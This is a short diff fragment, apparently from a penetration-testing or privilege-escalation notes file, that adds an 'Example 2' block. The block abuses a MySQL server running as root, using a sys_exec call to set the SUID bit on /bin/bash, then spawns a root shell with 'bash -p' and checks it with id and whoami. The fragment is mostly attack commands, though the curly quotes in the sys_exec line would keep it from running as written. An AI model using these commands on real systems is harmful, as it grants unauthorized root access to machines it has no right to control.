@@ -925,6 +925,19 @@ id && whoami
 ```
 
 Example 2
+```
+ps aux | grep root
+
+mysql -u root -p
+
+\! select sys_exec(‘chmod +s /bin/bash’);
+exit
+ls -la /bin/bash                          // Verify that the SUID bit is set
+/bin/bash -p 
+id && whoami
+```
+
+Example 3
 
 Victim
 ```
